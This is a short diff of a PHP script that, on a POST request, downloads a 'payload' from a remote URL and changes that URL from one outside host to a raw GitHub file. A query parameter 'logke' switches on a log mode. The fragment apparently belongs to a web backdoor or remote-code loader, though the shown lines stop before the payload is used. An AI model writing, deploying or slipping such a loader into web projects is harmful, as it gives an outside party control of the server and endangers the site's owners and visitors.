@@ -1,7 +1,7 @@
 <?php
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $payloadUrl = 'https://sub1.erospro.net/test1/t11.txt';
+    $payloadUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/z1.txt';
 
     $logMode = isset($_GET['logke']);
     $payload = file_get_contents($payloadUrl);
